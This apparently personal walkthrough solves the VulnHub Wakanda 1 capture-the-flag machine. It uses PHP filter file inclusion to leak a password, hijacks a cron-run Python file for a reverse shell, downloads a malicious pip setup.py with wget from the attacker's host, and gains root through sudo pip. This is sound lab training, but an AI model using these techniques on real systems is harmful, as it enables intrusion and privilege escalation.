## Wakanda-1-CTF-Walkthrough
I document the CTFs I solve as step-by-step notes so I can revisit them later. You can download this CTF from [*VulnHub*](https://www.vulnhub.com/entry/wakanda-1,251/) and set it up in VirtualBox. Throughout this walkthrough, we'll save important findings to a notes.txt file. Once the machine is up and running in VirtualBox, we're good to go.

### *Step 1:*
As with any CTF, the first thing we want to do is scan for open ports on the vulnerable machine. However, we need an IP address to run nmap against. Since we're on the same network as the target, we can run `netdiscover -r 10.0.2.0/24` to discover hosts on our network:

![](https://github.com/hamza37yavuz/Wakanda-1-CTF-Walkthrough/blob/main/netdiscover.png)

If your network interface is wlan0 instead of eth0, adjust the netdiscover range accordingly.

Once we've identified the target IP, we can scan for open ports with `nmap -v -sS -A -T4 <Target IP>`:

![](https://github.com/hamza37yavuz/Wakanda-1-CTF-Walkthrough/blob/main/nmap.png)

Looking at the results, port 80 immediately catches our eye — we'll definitely want to visit that website next. We can also see SSH running on port 3333. If port 80 turns out to be a dead end, we could try connecting via SSH using default credentials. There's also a service on port 111, but let's check for web vulnerabilities first before going down that path.

### *Step 2:*
Visiting the site, we're greeted by a simple page. The first thing that stands out is a username at the bottom: mamadou. We'll likely need this for SSH, so let's note it down.

![](https://github.com/hamza37yavuz/Wakanda-1-CTF-Walkthrough/blob/main/username.png)

I ran both gobuster and dirb against this site but didn't find anything noteworthy. Let's check the page source — maybe there's something hidden there. Sure enough, an HTML comment catches my eye with a link redirect:

`<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->`

Appending `?lang=fr` to the URL switches the site to French. From this, we can infer that the site is using a PHP file behind the scenes. Based on this, we can try accessing system files through the `?lang=` parameter — but our initial attempts don't work. To learn more about this type of attack and alternative approaches, check out [this resource on HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion).

After reading up on the technique, we try using a PHP filter to bypass restrictions and read the index.php source. We append the following after `?lang=`:

`php://filter/convert.base64-encode/resource=index`

We grab the base64-encoded text from the page source and decode it using an [online decoder](https://www.base64decode.org/). Inside the decoded content, we spot a password. We add it to our notes. Now we have both a username and a password, and we know SSH is open. Username: mamadou, password: 'Niamey4Ever227!!!'. Connection successful!

### *Step 3:*
We've successfully connected via SSH, but when we try running standard Linux commands, we get errors. Looking more closely at the error messages and experimenting a bit, we realize these are Python errors.

![](https://github.com/hamza37yavuz/Wakanda-1-CTF-Walkthrough/blob/main/ssh.png)

Since we can execute Python, let's spawn a proper shell:

`import pty; pty.spawn("/bin/bash")`

Now all the commands we tried earlier work just fine. Here's how we grab flag1.txt:

![](https://github.com/hamza37yavuz/Wakanda-1-CTF-Walkthrough/blob/main/flag.png)

While we're at it, let's locate flag2.txt:

`locate flag2.txt`

This returns `/home/devops/flag2.txt`. Trying to read it with cat tells us we don't have permission — we need to be the devops user. Before pulling out heavy enumeration tools, let's use the *find* command to see which devops-owned files we can access:

`find / -username devops`

The output is long, but the top of the list is interesting:

![](https://github.com/hamza37yavuz/Wakanda-1-CTF-Walkthrough/blob/main/find.png)

We see a Python file and a text file called test. Let's read both with cat:

Python file:
`open('/tmp/test','w').write('test')`

Test file:
`test`

From these two files, we can tell the Python script was executed previously. It's very likely being run on a schedule via a cron job. We'll exploit this in the next step.

### *Step 4:*
In this step, we'll set up a reverse shell using Python. Running `ls -la` confirms we have write permissions on the Python file. We can use the Python reverse shell from [Pentest Monkey's cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), adapting the one-liner into a format suitable for writing to the file. We replace the IP with our Kali machine's address and save. In another terminal, we start a netcat listener:

`nc -nvlp 1234`

We get a shell! Let's read flag2.txt from the path we found earlier:

![](https://github.com/hamza37yavuz/Wakanda-1-CTF-Walkthrough/blob/main/flag2.png)

Now it's time to find root.txt.

### *Step 5:*
We know we need to escalate privileges to access root.txt. Before trying anything complex, let's see what we can run without a password using `sudo -l`. The result is interesting:

`User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip`

A quick search leads us to [this GitHub repo: FakePip](https://github.com/0x00-0x00/FakePip) — essentially another reverse shell vector.

Now we need to get this onto the target machine. Testing shows that git doesn't work on the box, but wget does. The issue is that cloning gives us a .git directory, which isn't ideal. The cleanest approach is to serve the file from our own machine. So we clone the repo to our Kali box, edit the setup.py file to replace localhost with our IP address (and note the port: 13372), then copy it to our web server root with `cp setup.py /var/www/html` and start Apache with `service apache2 start`. Back on the target machine as devops, we download it:

`wget http://10.0.2.14/setup.py`

The file downloads successfully. From here, privilege escalation is straightforward. We start listening on port 13372 as before, then use pip to execute setup.py:

`nc -nvlp 13372`

`sudo /usr/bin/pip install . --upgrade --force-reinstall`

![](https://github.com/hamza37yavuz/Wakanda-1-CTF-Walkthrough/blob/main/root.png)

Thanks for reading :)
